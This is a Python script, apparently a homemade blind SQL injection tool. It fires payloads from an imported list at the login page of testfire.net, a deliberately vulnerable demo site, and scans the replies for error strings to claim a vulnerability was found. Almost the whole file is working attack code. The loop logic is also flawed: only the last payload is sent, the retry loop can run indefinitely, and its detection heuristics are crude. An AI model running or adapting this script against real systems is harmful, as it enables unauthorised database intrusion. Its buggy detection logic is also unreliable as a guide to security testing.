import sys
sys.path.append(r"D:\SQLjj\SQLJ\Database")
from database import main_prog,extraction
import asyncio
import requests
from colorama import Fore,init
import re

init()

async def blind_attack():
    try:
        # await main_prog()
        url = "http://testfire.net/login.jsp"
        pattern = r"\berror\b"
        htmlpattern = r"\bid\b"
        r = requests.get(url)
        if r.status_code == 200:
            payloadask = input("Looks like the Host is up.Do you want to send a payload to the target?")
            if payloadask == "y":
                # await extraction()
                for i in extraction:
                    for j in i:
                        new = j
                        new = str(new)
                        print(new)
                        # print(new+new+new+new+new)
                        # print(str(i))
                        await asyncio.sleep(10)
                req = requests.post(url=url,data=str(new))
                print(req.status_code)
                done = False
                while not done:
                    req = requests.post(url=url,data=str(new)+str(new)+str(new)+str(new)+str(new))
                    if req.status_code == 302:
                        done = True
                    else:
                        await asyncio.sleep(5)
                        print("Status code:",req.status_code)
                        print(Fore.RED+str(req.status_code))
                        await asyncio.sleep(5)
                        print("exploiting...")
                        print(req.text)
                        if "Syntax error" in req.text:
                            print(Fore.RED+"Vulnerability found:",req.text)
                            print(req.text)
                            
                        if re.search(pattern,req.text,flags=re.IGNORECASE):
                            print(Fore.RED+"Vulnerability found:",req.text)
                            print(req.text)
                        
                        info = re.findall(htmlpattern,req.text,flags=re.IGNORECASE)
                        if info:
                            print(Fore.GREEN+"Vulnerability found at the row lenght:",len(req.text))
                            print(req.text)
                            pattern = r'\b\S+\s+id\s+\S+\b'
      # Regular expression pattern to match the word 'id' and the neighboring words
                            matches = re.findall(pattern, req.text, flags=re.IGNORECASE)
                            if matches:
                                print(Fore.GREEN+"Vulnerability found at the row lenght:",len(req.text))
                                # print(req.text)
                                
                            else:
                                print(Fore.GREEN+"nothing found")
                        

                
        else:
            # raise SystemExit
            pass
        # print(Fore.RED+str(r.status_code))
                
    except ConnectionError:
        pass
    
    except requests.ConnectionError:
        print("error")
        
    except NameError as e:
        print("Name error occurred:",e)
        
    finally:
        pass
            
asyncio.run(blind_attack())    
# res = requests.get("http://testfire.net/")
# print(res.status_code)